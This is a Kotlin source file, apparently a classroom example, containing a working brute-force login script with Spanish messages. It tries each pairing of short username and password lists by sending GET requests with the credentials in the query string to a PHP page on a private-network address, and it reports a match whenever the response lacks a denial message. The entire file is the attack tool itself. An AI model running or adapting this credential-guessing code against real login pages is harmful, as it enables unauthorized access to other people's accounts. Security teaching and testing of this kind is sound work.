package Ejemplos

import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URI

fun main() {
    val targetURL = "http://192.168.2.216/a/FuerzaBruta/postraw.php"

    val usuarios = listOf("pedro", "admin", "user", "test", "root")
    val contrasenas = listOf("123456", "password", "1234", "admin", "test", "123", "password123")

    println("Iniciando ataque de fuerza bruta...")
    println("URL objetivo: $targetURL")
    println("=" * 50)

    var credencialesEncontradas = false

    for (usuario in usuarios) {
        for (contrasena in contrasenas) {
            println("Probando: usuario='$usuario', contraseña='$contrasena'")

            val resultado = probarCredenciales(targetURL, usuario, contrasena)

            if (resultado) {
                println("\n" + "=" * 50)
                println("¡CREDENCIALES ENCONTRADAS!")
                println("Usuario: $usuario")
                println("Contraseña: $contrasena")
                println("=" * 50)
                credencialesEncontradas = true
                break
            }
        }
        if (credencialesEncontradas) {
            break
        }
    }

    if (!credencialesEncontradas) {
        println("\nNo se encontraron credenciales válidas con las listas proporcionadas.")
    }
}

fun probarCredenciales(url: String, usuario: String, contrasena: String): Boolean {
    return try {
        val url = "$url?username=$usuario&password=$contrasena"
        val connection = URI(url).toURL().openConnection() as HttpURLConnection

        connection.requestMethod = "GET"
        connection.connectTimeout = 5000
        connection.readTimeout = 5000

        val inputStream = connection.inputStream
        val reader = BufferedReader(InputStreamReader(inputStream))

        val respuesta = StringBuilder()
        var line: String?
        while (reader.readLine().also { line = it } != null) {
            respuesta.append(line)
        }

        reader.close()
        connection.disconnect()

        val respuestaCompleta = respuesta.toString()
        val esExitoso = !respuestaCompleta.contains("Acceso denegado", ignoreCase = true) &&
                !respuestaCompleta.contains("MUY mal", ignoreCase = true)

        if (esExitoso) {
            println("¡Posible éxito! Respuesta diferente recibida:")
            println(respuestaCompleta)
        }

        esExitoso

    } catch (e: Exception) {
        println("Error al conectar: ${e.message}")
        false
    }
}



operator fun String.times(n: Int): String {
    return repeat(n)
}